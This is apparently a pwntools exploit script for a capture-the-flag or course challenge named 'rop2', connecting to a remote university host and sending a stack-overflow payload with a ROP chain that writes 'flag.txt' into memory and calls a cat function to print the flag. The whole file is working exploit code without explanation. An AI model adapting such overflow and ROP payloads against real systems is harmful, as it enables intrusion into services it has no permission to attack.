from pwn import *

elf = ELF('./rop2')
context.binary = elf

p = remote("lettieri.iet.unipi.it", 4492)

rdi_gadget = 0x00007ffff7e2b796  # pop rdi ; ret
filename_addr = 0x403538
rsi_gadget = 0x00007ffff7e2d90f # pop rsi ; ret
mov_rsi_rdi_gadget =  0x00007ffff7f1daad  # mov qword ptr [rsi], rdi ; ret
cat_addr = 0x401252

payload = b"A" * 40
payload += p64(rdi_gadget)
payload += b'flag.txt'
payload += p64(rsi_gadget)
payload += p64(filename_addr)
payload += p64(mov_rsi_rdi_gadget)
payload += p64(cat_addr)

p.sendline(payload)
p.interactive()

